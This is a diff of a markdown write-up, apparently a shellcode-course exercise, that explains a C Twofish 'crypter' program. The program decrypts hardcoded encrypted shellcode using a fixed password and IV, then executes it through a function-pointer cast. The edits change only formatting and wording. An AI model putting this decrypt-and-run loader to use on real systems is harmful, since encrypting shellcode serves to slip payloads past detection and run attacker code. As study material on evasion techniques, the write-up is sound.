@@ -155,10 +155,11 @@ int main (void)
 ### DeCrypt: Twofish_Decrypter.c
 ---
 This code does exactly the same as before. Just that this time it decrypts the shellcode given. 
-> Decrypt needs the same password and IV used to crypt 
-The code, once the shellcode has been decrypted, executes it.
 
-The steps are the same as before. The program has the string containing the crypted shellcode in hex format, decrypts with the same password and IV used to crypt, and once this done runs the decrypted shellcode using the following code snippet:
+> Decrypt needs the same password and IV used to crypt 
+
+
+The steps are the same as before. The program has the string containing the crypted shellcode in hex format, decrypts with the same password and IV used to crypt, and once this is done, runs the decrypted shellcode using the following code snippet:
 ```c
 	int (*ret)() = (int(*)())code;
 	ret();
@@ -175,25 +176,19 @@ The full code can be found in the [TwoFish_Decrypter.c](https://github.com/galmi
 #define IV_SIZE 16
 unsigned char password[] = "12345678";
 // Same IV as crypt
-unsigned char IV[IV_SIZE] = \
-"\x4b\x43\x90\xbe\x44\x14\x30\x8a\x31\x3d\xed\xba\xfd\x1f\x35\x5e";
+unsigned char IV[IV_SIZE] = "\x4b\x43\x90\xbe\x44\x14\x30\x8a\x31\x3d\xed\xba\xfd\x1f\x35\x5e";
 
-
-/*
-  ShellCode to decrypt
-*/
+//  ShellCode to decrypt
 unsigned char code[]= \
 "\xac\x8a\x9f\x32\x01\xa0\x32\xf2\x2d\xdc\xa6\xd9\xbe\xe7\x54\xe4\xa2\xbc\x05\x54\x10\x75\x13\xad\xf5\xb2\xa6\xc8\x09\xcc\xc8\x0d";
 
 int main (void)
 {
-
 	MCRYPT id_crypt;
 	int code_length = strlen(code);
 
 	printf("\nCrypted Shellcode (%d bytes):\n", code_length);
-	for (int i = 0; i < code_length-1; i++)
-	{
+	for (int i = 0; i < code_length-1; i++) {
 		printf("0x%02x,", code[i]);
 	}
 	printf("0x%02x", code[code_length-1]);	                    // Remove last ","
@@ -204,8 +199,7 @@ int main (void)
 	/* IV initialization */
 	printf("\n\nTwoFish IV value: ");
 	int iv_size = mcrypt_enc_get_iv_size(id_crypt);
-	for (int i = 0; i < iv_size-1; i++)
-	{
+	for (int i = 0; i < iv_size-1; i++) {
 		printf("0x%02x,", IV[i]);
 	}
 	printf("0x%02x", IV[iv_size-1]);	                        // Remove ","
@@ -235,16 +229,14 @@ int main (void)
 	printf("\n\nDeCrypted Shellcode:\n\n  ASM Format: \n");
 
 		/* First printed in ASM format */
-	for (int i = 0; i < code_length-1; i++)
-	{
+	for (int i = 0; i < code_length-1; i++) {
 		printf("0x%02x,", code[i]);
 	}
 	printf("0x%02x", code[code_length-1]);	                    // Remove ","
 
 		/* Now printed in C format */
 	printf("\n\n  C Format: \n");
-	for (int i = 0; i < code_length-1; i++)
-	{
+	for (int i = 0; i < code_length-1; i++) {
 		printf("\\x%02x,", code[i]);
 	}
 	printf("\\x%02x", code[code_length-1]);                     // Remove last ","
